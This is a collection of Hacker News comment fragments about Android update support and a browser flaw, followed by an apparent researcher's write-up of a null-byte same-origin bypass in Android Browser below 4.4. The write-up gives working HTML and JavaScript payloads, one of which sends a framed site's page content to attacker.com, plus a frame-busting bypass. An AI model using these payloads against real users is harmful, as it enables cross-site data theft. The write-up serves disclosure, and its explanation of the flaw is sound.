Slight battery drain issues, but those are almost all solved in recent releases. Definitely give it a try. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on Sept 16, 2014](item?id=8325426)   | [parent](#8322048) | [prev](#8326032) | [next](#8321596) [–]  It crashes every time I hit the menu button. I sent in the crash report; I couldn't figure out where on mozilla's website to report mobile bugs though. | | --- | --- | --- | | | |  |  | [allegory](user?id=allegory) [on Sept 15, 2014](item?id=8321596)   | [prev](#8322048) | [next](#8321643) [–]  It's this sort of thing that puts me off Android as a platform. Even my mother got sold a 2.2 handset recently (Samsung Galaxy Ace) that hasn't been patched for the best part of 3 years. You never know when you're going to end up with a lemon on your hands. Big jump to this conclusion but I'm more inclined to trust Microsoft at the moment as they have a better reputation for lifetime (unlike Android), have a very public security process and good industry comms and the devices are proven usable if not faster after recent updates (unlike iOS which starts to be terribly limiting performance-wise). Plus they're dirt cheap. | | --- | --- | --- | | | |  |  | [legohead](user?id=legohead) [on Sept 15, 2014](item?id=8322016)   | [parent](#8321596) | [next](#8321663) [–]  Yes, this continues to be a problem that I hope Google addresses somehow. I got the Samsung Galaxy *Nexus* because I assumed it would be kept up to date with the latest Android version, since it's using the Google brand 'Nexus' name. I even asked the sales representative if it would be kept up to date (knowing I couldn't trust them, but was looking for any extra assurance), and they said yes. Right now it's at 4.3 and wont upgrade... | | --- | --- | --- | | | |  |  | [mbq](user?id=mbq) [on Sept 15, 2014](item?id=8322157)   | [root](#8321596) | [parent](#8322016) | [next](#8322528) [–]  Just switch to CyanogenMod or other custom compilation; there is a gain from Nexus brand in the ease of unlocking bootloader (; | | --- | --- | --- | | | |  |  | [gsnedders](user?id=gsnedders) [on Sept 16, 2014](item?id=8322357)   | [root](#8321596) | [parent](#8322157) | [next](#8322528) [–]  I'm not convinced CyanogenMod (or any other variant) is actually that great; I have a Samsung Galaxy S2 (i9100 model), the last non-nightly CyanogenMod update was over a year ago now. There have been a number of CVEs issued for Android (and likely numerous others cover Android as a platform, covering OpenSSL for example) over that time period, so there's no way the phone is anywhere near up-to-date with security fixes. CyanogenMod doesn't have any way to distinguish which phones are currently receiving security fixes in a timely manner and which are not; nor do they have any list of security advisories covering packages they distribute (go look at any notable desktop/server Linux distro — they *all* have public lists of security advisories and documentation of what release fixes them). To my knowledge there is no Android distribution that has anywhere near the cohesive security story — and they're all miles behind any desktop OS. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on Sept 16, 2014](item?id=8323243)   | [root](#8321596) | [parent](#8322357) | [next](#8323230) [–]  CyanogenMod changed their release versioning. There are no more "stable" builds anymore, at all. You're supposed to run "monthly" or "milestone" or whatever they are called. Yes, I think they could have communicated this much better. | | --- | --- | --- | | | |  |  | [gsnedders](user?id=gsnedders) [on Sept 16, 2014](item?id=8323252)   | [root](#8321596) | [parent](#8323243) | [next](#8323230) [–]  And anyone running the stable builds have therefore never been updated to an at all recent build… *sighs* And looking at my phone, I have no idea how I'm meant to update to the milestone builds. The updater lets me select "stable" or "all (inc. nightly)", and nowhere do the milestone builds appear… None of this is helping me believe there's really any decent security story. Abandon all users who don't check the website (or whatever) to find out about releases, trusting the built-in updater to provide updates. Never publish any security advisories that cover your distribution… | | --- | --- | --- | | | |  |  | [frankzinger](user?id=frankzinger) [on Sept 16, 2014](item?id=8323230)   | [root](#8321596) | [parent](#8322357) | [prev](#8323243) | [next](#8325739) [–]  > I have a Samsung Galaxy S2 (i9100 model), the last non-nightly CyanogenMod update was over a year ago now. Same. The newest version which supports my phone is years old, and there are major usability issues, particularly in the dialler interface. The manufacturer (HTC) UI was *miles* better (i.e., actually *usable*). | | --- | --- | --- | | | |  |  | [thejdude](user?id=thejdude) [on Sept 16, 2014](item?id=8325739)   | [root](#8321596) | [parent](#8322357) | [prev](#8323230) | [next](#8323295) [–]  Are you sure? My Galaxy S 1 (one) still gets updates, as does my S3. They're monthly milestones now. Maybe you need to install CM 11 first, so the system has a base to work with. I think you can see if your phone gets updates if it's listed as CM11-supported. | | --- | --- | --- | | | |  |  | [NickNameNick](user?id=NickNameNick) [on Sept 16, 2014](item?id=8323295)   | [root](#8321596) | [parent](#8322357) | [prev](#8325739) | [next](#8322528) [–]  It looks like there were snapshot builds in august and july. (although how they differ from nightlies, I don't know) I thought I was on a snapshot from April, but it turns out I'm on a nightly. | | --- | --- | --- | | | |  |  | [thejdude](user?id=thejdude) [on Sept 16, 2014](item?id=8325748)   | [root](#8321596) | [parent](#8323295) | [next](#8322528) [–]  There was a monthly in August something, and I just installed the latest one which is from today. It may not yet be built for all supported devices though. | | --- | --- | --- | | | |  |  | [jamesisaac](user?id=jamesisaac) [on Sept 16, 2014](item?id=8322528)   | [root](#8321596) | [parent](#8322016) | [prev](#8322157) | [next](#8329597) [–]  Same situation here. I could put up with outdated Android version, gradually deteriorating performance, and bloating of apps leading to very little free space, but it's very disappointing to find out that even to remain secure, we're expected to shell out at every stage of Google's 12-month release cycle... | | --- | --- | --- | | | |  |  | [spb](user?id=spb) [on Sept 17, 2014](item?id=8329597)   | [root](#8321596) | [parent](#8322016) | [prev](#8322528) | [next](#8321663) [–]  Try ShinyROM, it's an almost-exactly AOSP build of 4.4: <http://shinyrom.goofball.org/> | | --- | --- | --- | | | |  |  | [Zigurd](user?id=Zigurd) [on Sept 15, 2014](item?id=8321663)   | [parent](#8321596) | [prev](#8322016) | [next](#8323950) [–]  Android One is meant to make it simple for lo-end OEMs to ship high quality implementations of up-to-date Android and keep up with new releases. It's hard to migrate a huge OEM ecosystem to that kind of program quickly. | | --- | --- | --- | | | |  |  | [npizzolato](user?id=npizzolato) [on Sept 16, 2014](item?id=8322322)   | [root](#8321596) | [parent](#8321663) | [next](#8321836) [–]  And Nexus was meant to make it simpler for Google to ship updates directly to users, rather than having to go through OEMs. If Google can't keep their own phones up to date, do you expect Android One to be any different? | | --- | --- | --- | | | |  |  | [blocke](user?id=blocke) [on Sept 16, 2014](item?id=8322389)   | [root](#8321596) | [parent](#8322322) | [next](#8321836) [–]  The only Nexus phones here that don't already have a fix available is the phone they announced as being end of life. 4.4 is not affected and is available for the Nexus 4, 5, both generations of 7 and I believe the 10. Dear Galaxy Nexus users... It's time to let go. | | --- | --- | --- | | | |  |  | [jamesisaac](user?id=jamesisaac) [on Sept 16, 2014](item?id=8322567)   | [root](#8321596) | [parent](#8322389) | [next](#8321836) [–]  The Galaxy Nexus was released only 3 years ago. Since when was that beyond the expected lifespan of a flagship product from one of the world's largest tech companies? Don't think I've ever owned anything with such a serious planned obscolence issue. Windows supports its OS releases for 12 years (and doesn't lock you in, so you can usually follow official upgrade procedure anyway). And anything "dumber" than a smartphone doesn't really open itself up to these gaping security flaws, so still operates fine after many years. | | --- | --- | --- | | | |  |  | [judk](user?id=judk) [on Sept 16, 2014](item?id=8322854)   | [root](#8321596) | [parent](#8322567) | [next](#8322829) [–]  The GN wasn't planned obsolescence so much as "Google doesn't actually own the hardware, so they can't update drivers" | | --- | --- | --- | | | |  |  | [allegory](user?id=allegory) [on Sept 16, 2014](item?id=8323340)   | [root](#8321596) | [parent](#8322854) | [next](#8322829) [–]  Do the drivers need updating?

Since when was that beyond the expected lifespan of a flagship product from one of the world's largest tech companies? It became beyond the expected lifespan when it became normal to buy a new one every 2 years thanks to contract pricing and carriers pushing people to upgrade. | | --- | --- | --- | | | |  |  | [allegory](user?id=allegory) [on Sept 16, 2014](item?id=8323334)   | [root](#8321596) | [parent](#8322829) | [next](#8322723) [–]  That works apart from in Europe. We do a lot of non contract pay as you go stuff where the handset may last 4-5 years. I have a couple of Nokias that are still good after 8 years and Microsoft have a 11-12 year lifecycle for desktop OS for example. 2 years is just a cost cutting exercise and inexcusable. | | --- | --- | --- | | | |  |  | [wernercd](user?id=wernercd) [on Sept 16, 2014](item?id=8322723)   | [root](#8321596) | [parent](#8322567) | [prev](#8322829) | [next](#8321836) [–]  Since when has anything over 2 years, for a phone, had support? Anything over that is the exception, not the rule. Apple has better support than most, but even their phones degrade with features missing on older phones AND included new features run like ass (every time my fiance upgrades old phone to new iOS she hate life until upgrade). A 2 year old phone really is ancient... much less three or four... Who actually supports phones that old CONSISTENTLY? | | --- | --- | --- | | | |  |  | [jamesisaac](user?id=jamesisaac) [on Sept 16, 2014](item?id=8322764)   | [root](#8321596) | [parent](#8322723) | [next](#8323338) [–]  Well yeah with smartphones really short release cycles are "the rule" - because Google/Apple dominate the industry and set the rules - that's what I'm complaining about. There's no fundamental reason a 2 year old phone should be seen as ancient. Hardware can last many times longer than that, and software can be updated. Google is just not making the effort to support its older devices. For people like me who don't want to buy a new phone every 18 months (both a wasteful use of my money, and the earth's natural resources), Android is looking like a pretty bad choice. | | --- | --- | --- | | | |  |  | [wernercd](user?id=wernercd) [on Sept 16, 2014](item?id=8322861)   | [root](#8321596) | [parent](#8322764) | [next](#8323338) [–]  Well, honestly, it's not just Android. iPhones have built in time lines (more or less replaceable anything. Need a new batter? Have fun...). And then there is the face that if you want ANY kind of app support - not just OS. Facebook, Twitter, etc... - then you can't use old phones. Years old Windows phones. Look at Blackberry phones. Palm OS. No one supports them because well... no one supports them anymore. I think it's more a function of the rapid change and growth of complexity that makes smartphones obsolete so quick. Screen density, cpu, graphics capabilities, hard drive space, antenna speeds, etc. EVERYTHING is increasing so quick that it's hard to compare a new phone to a 2 year old phone. It'll most likely be years before it slows down enough that you can treat a smart phone like a PC - keep it for YEARS and expect most stuff to simply run on it. | | --- | --- | --- | | | |  |  | [allegory](user?id=allegory) [on Sept 16, 2014](item?id=8323338)   | [root](#8321596) | [parent](#8322723) | [prev](#8322764) | [next](#8323250) [–]  My 2 year old Lumia 820 just got Windows Phone 8.1 and is as good as new in every way even though it has been dropped hundreds of times. It's getting the next 8.1 update next month as well. That's what I *expect*. | | --- | --- | --- | | | |  |  | [ClashTheBunny](user?id=ClashTheBunny) [on Sept 16, 2014](item?id=8323250)   | [root](#8321596) | [parent](#8322723) | [prev](#8323338) | [next](#8321836) [–]  But at least there is the choice with Apple. You don't have to upgrade, but if you want the new security fixes, you have them. With Android, if you find a beloved phone by many, you will be supported for YEARS. My gTablet was being updated by the community for 4 years after the last official update. My Galaxy Note has nightlies from multiple different projects. My wife's Sony Xperia Arc S has consistent updates still. You find a phone that people fell in love with and you will have your updates until the hardware is dead. | | --- | --- | --- | | | |  |  | [allegory](user?id=allegory) [on Sept 15, 2014](item?id=8321836)   | [root](#8321596) | [parent](#8321663) | [prev](#8322322) | [next](#8324031) [–]  I doubt that will happen. At $100 a handset where is the return and motivation for an OEM to bother pushing updates out for firmware/integration testing etc (that the telcos require)?

My guess would be that the URL is being validated with code which relies on null-terminated strings, and it's being processed/executed with code that uses a separate length value. The empty string "" will pass a same-origin check as it refers to the current page. "\0javascript:alert()" looks like the empty string to validation code expecting null-terminated strings. However, it's a valid URL and is executed as JavaScript by code that knows the true length. One easy way this could happen is if the same-origin check happens in C++ (eg. WebKit) and the URL fetch happens in Java. The same problem can happen in reverse and has before. Java had a file path vulnerability where Java code would see the full path and the OS calls Java passed to would only process up to the first null. This opened up bypasses in application logic designed to validate paths. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Sept 16, 2014](item?id=8322809)   | [root](#8321643) | [parent](#8322600) | [next](#8322676) [–]  *However, it's a valid URL* I doubt "\0javascript" is a valid URI scheme since they must begin with a letter, and any code that uses 0-terminated strings would just see it as an empty string.

Font sizing is bizarre too. Web pages suddenly have font sizes increasing and decreasing seemingly at random, and to the point of illegibility.

This is an issue with a browser that Google hasn't supported for several years, since they replaced it with Chrome. It also doesn't affect alternative browsers like Firefox or Opera.

That'll probably change next month or two I'd guess. But unless I'm entirely off base and talking about the wrong thing, I think your comment is very misleading.

Android has everything to do with Linux in its usage of the Linux kernel, but its userspace offers none of the actual advantages of using a Unix-like kernel. The GNU/Linux terminology is actually quite relevant here, seeing as Android is Linux, but not GNU/Linux.

Can I do that with an iPhone? Maybe, but probably have to put up with a lot of Apple garbage, trying to make things "easy" for non-technical people and/or keep you in their ecosystem. I also like that Android uses Linux because I think the proliferation of Linux is good for me. (For various reasons, not that I have a financial stake in it, although I do indirectly due to my technical areas of competence.) In that sense, I prefer that it uses Linux marginally over, say, using FreeBSD, which I would still prefer infinitely more than a proprietary OS. | | --- | --- | --- | | | |  |  | [ufmace](user?id=ufmace) [on Sept 16, 2014](item?id=8322755)   | [parent](#8321845) | [prev](#8322189) | [next](#8321908) [–]  I find Android's a lot nicer if you stick to Nexus and GPE devices, and don't root or otherwise hack them.

Most people don't have the ability to make an informed decision about a phones purchase (or they want to buy an iPhone or Nexus but they simply can't afford it). I bought a Google Nexus at USD650 *retail* - a perfect counterexample to your advice. I recommend iPhones to those who can afford it (purchase price, insurance, screen replacements etc.). I recommend Huawei Y310/320/330 for those who don't have much. In between there are too many other factors to make a straight recommendation (e.g. buy second hand iPhone versus a Moto G). | | --- | --- | --- | | | |  |  | [bad\_user](user?id=bad_user) [on Sept 16, 2014](item?id=8323236)   | [root](#8321845) | [parent](#8323205) | [next](#8323253) [–]  My one year old Nexus 4 is on KitKat. I guess you're talking about the Galaxy Nexus. While I agree with you that they dropped the support a way too soon, being the reference phone you'll have no problems in updating it with CyanogenMod, which is a really good distribution btw. But as a slight counterpoint, given the fast release cycle, you can't expect them to support a phone forever. You mentioned iPhones. Well I have an iPhone 3GS. It's a perfectly capable phone that still works and that was still sold as the low-price alternative after iPhone 4 happened, yet Apple stopped supporting it as well. But I can understand that, because these OSes get more bloated with stuff and it leads to a shitty experience. I was able to upgrade an older Galaxy S (first generation, shipped originally with 2.1) to 4.3 by means of CyanogenMod and it was unusable due to the less than capable hardware. Google did drop the support too early for the Galaxy Nexus, but try out CyanogenMod. I'm even thinking of installing it on my Nexus 4 because the Android on this device is bloated with Google-stuff that I cannot uninstall and it pisses me off. It's also enlightening to install CyanogenMod without Google Play, for an all open-source experience ;-) | | --- | --- | --- | | | |  |  | [tuxracer](user?id=tuxracer) [on Sept 16, 2014](item?id=8323456)   | [root](#8321845) | [parent](#8323236) | [next](#8323253) [–]  [http://www.androidheadlines.com/2014/09/galaxy-nexus-will-li...](http://www.androidheadlines.com/2014/09/galaxy-nexus-will-likely-cyanogenmod-support-android-l.html) | | --- | --- | --- | | | |  |  | [bad\_user](user?id=bad_user) [on Sept 16, 2014](item?id=8323612)   | [root](#8321845) | [parent](#8323456) | [next](#8323253) [–]  Ouch.

It would be better if the solution wasn't to push Chromium but a storage framework style pluggable component, mainly since they can't get stuff like text sizing right. Luckily since most vital user info is going to be in apps this doesn't have nearly the same impact as it would on desktop, but it does represent yet another demonstration that having the web as a sort of super-platform-on-a-platform doubles your attack surface. Android really is comparable to 90s era Windows, in every possible sense. For better or worse Chrome OS is clearly being positioned as the NT equivalent as well, but it's hard to see how you can recreate the functionality of Android without adopting the flaws too. | | --- | --- | --- | | | |  |  | [kb120](user?id=kb120) [on Sept 15, 2014](item?id=8321610)   | [prev](#8325076) | [next](#8322173) [–]  So the bug is only for a browser that isn't supported by Google?

Also from the comments thread: "to fix this we'd want to know the widths of the containers of all the text, which requires doing layout on the whole subtree (or at least a decent part of it), but we need to know the inflation numbers before we do layout.

#### Introduction

Same Origin Policy (SOP) is one of the most important security mechanisms that are applied in modern browsers, the basic idea behind the SOP is the javaScript from one origin should not be able to access the properties of a website on another origin. The origin is formed by the combination of Scheme, domain and port with the port being an exception to IE. There are some exceptions with SOP such the location property, objects wtih src attribute. However, the fundamental are that different origins should not be able to access the properties of one another.

#### SOP Bypass

A SOP bypass occurs when a sitea.com is some how able to access the properties of siteb.com such as cookies, location, response etc. Due to the nature of the issue and potential impact, browsers have very strict model pertaining it and a SOP bypass is rarely found in modern browsers. However, they are found once in a while. The following writeup describes a SOP bypass vulnerability i found in my Qmobile Noir A20 running Android Browser 4.2.1, and later verified that Sony+Xperia+Tipo, Samsung galaxy, HTC Wildfire, Motrorolla etc are also affected. To best of my knowledge, the issue occurred due to improper handling of nullbytes by url parser.

**Update:** Other folks have verified this issue to work under Android browser < 4.4. Ref - <https://github.com/rapid7/metasploit-framework/pull/3759>

The following is a proof of concept:
#### Proof Of Concept

<iframe name="test" src="http://www.rhainfosec.com"></iframe>

<input type=button value="test"

onclick="window.open('\u0000javascript:alert(document.domain)','test')" >

As you can see that the code tries accessing the document.domain property of a site loaded into an iframe. If you run the POC at attacker.com on any of the modern browsers, it would return a similar error as attacker.com should not be able to access the document.domain property of rhainfosec.com.

Blocked a frame with origin "[http://jsbin.com](http://jsbin.com/ "http://jsbin.com")" from accessing a frame with origin "[http://www.rhainfosec.com](http://www.rhainfosec.com/ "http://www.rhainfosec.com")". Protocols, domains, and ports must match.

1. [vagugebiweja:7](https://www.blogger.com/null "http://jsbin.com/vagugebiweja:7")

However, running it on any of the vulnerable smart phones default browsers would alert the document.domain property indicating that the SOP was not able to restrict the access to document.domain property of a site at a different origin.

I created the following POC, so you can mess around with some stuff:
#### Reading the response

You can read the response of any page by accessing the document.body.innerHTML property.

<iframe name="test" src="http://www.rhainfosec.com"></iframe>

<input type=button value="test"

onclick="window.open('\u0000javascript:alert(document.body.innerHTML)','test')" >

#### Reading the response and sending it to an attackers domain

In real world situation an attacker would send the response to his controlled domain.

<iframe name="test" src="http://www.rhainfosec.com"></iframe>

<input type=button value="test"

onclick="window.open('\u0000javascript:var i=new Image();i.src='//attacker.com?'+document.body.innerHTML;document.body.appendChild(i);','test')" >

#### Bypassing Frame Busting Code

A lot of websites still use frame busting code to prevent the page from being prevent and since we can only bypass SOP here when the site could be framed. In case, where the site is using a frame busting code, we can bypass it using the sandbox attribute that was introduced as a part of HTML5 specifications.

<iframe name="test" src="http://www.rhainfosec.com" sandbox></iframe>

<input type=button value="test"

onclick="window.open('\u0000javascript:var i=new Image();i.src='//attacker.com?'+document.body.innerHTML;document.body.appendChild(i);','test')" >

**Update:** A metasploit module has been released by jvennix-r7 which also supports x-frame-options bypass making it a completely universal exploit.  **Ref - <https://github.com/rapid7/metasploit-framework/pull/3759>**

#### Affected Versions

The initial tests were carried out on android browser 4.2.1 (Qmobile) and below and later verified with Galaxy S3, HTC wildfire, Sony Xperia, Qmobile etc.

The following are some of the smartphones i tested with browserstack.com.
#### Samsung Galaxy S3

   In generic terms it is referred as an end of a string (C world), it is also referred as an escape sequence.

   Its because when the parser encounters the null bytes, it thinks that the string has been terminated, however it hasn't been, which in my opinion leads the rest of the statement being executed.
